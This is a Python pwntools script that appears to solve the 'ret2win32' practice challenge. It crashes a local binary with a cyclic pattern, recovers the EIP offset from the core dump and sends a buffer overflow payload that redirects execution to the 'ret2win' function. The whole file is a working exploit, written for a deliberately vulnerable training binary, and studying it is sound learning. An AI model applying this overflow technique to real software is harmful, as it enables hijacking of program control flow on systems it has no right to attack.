from pwn import *

p = process("./ret2win32")
e = ELF("./ret2win32")

ret_addr = e.symbols["ret2win"]

# Crash the program
p.recvuntil(b">")
p.sendline(cyclic(50))
p.wait()

# Read the crash address from EIP to find offset
core = p.corefile
offset = cyclic_find(core.eip)

payload = b'A' * offset
payload += p32(ret_addr)

p = process("./ret2win32")
p.recvuntil(b">")
p.sendline(payload)
p.interactive()
